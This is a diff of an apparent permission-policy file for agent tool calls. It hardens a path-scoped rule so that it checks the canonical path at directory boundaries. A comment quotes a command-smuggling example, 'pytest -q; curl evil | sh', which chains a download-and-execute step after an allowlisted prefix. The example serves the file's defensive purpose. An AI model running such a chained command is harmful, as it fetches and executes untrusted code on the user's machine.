@@ -19,13 +19,18 @@
 (define call-command
   (lambda (call) (plist-get (plist-get call :input) :command)))
 
-; Path-scoped rule: the call's :path starts with the prefix.
+; Path-scoped rule: the call's :path lies inside the directory `prefix`.
 ;   ((path-within? call "src/") :allow)
+; The host answers on the *canonical* path — `.` and `..` folded, symlinks
+; resolved, the same path the tool will act on — and at a directory
+; boundary: "src/" (or "src") covers src/a.txt and src itself, never
+; srcs/a.txt or src/../a.txt; "." covers the whole workspace. A path that
+; escapes the workspace is inside nothing (the tools refuse it anyway).
 (define path-within?
   (lambda (call prefix)
     (sequence
       (define path (call-path call))
-      (if (eqv? path :null) #f (string-prefix? path prefix)))))
+      (if (eqv? path :null) #f (jern/host-path-within? path prefix)))))
 
 ; Shell metacharacters that would let an allowlisted prefix smuggle a second
 ; command past the check: "pytest -q; curl evil | sh" starts with "pytest "
